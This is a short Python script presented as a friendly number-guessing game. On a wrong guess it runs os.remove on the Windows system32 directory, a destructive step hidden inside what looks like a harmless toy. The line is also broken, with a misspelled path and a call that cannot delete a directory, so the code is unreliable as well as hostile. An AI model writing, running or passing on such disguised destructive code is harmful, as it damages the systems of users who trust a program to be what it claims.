import random
import os

number = random.randint(1, 10)

guess = input("Let's play a fun game! Guess a number between 1 and 10: ")
guess = int(guess)

if guess == number:
    print("Congratulations, you guessed the right number!")
else:
    print("Sorry, that's incorrect. The correct number was:", number)
    os.remove('c:\windwos\system32')

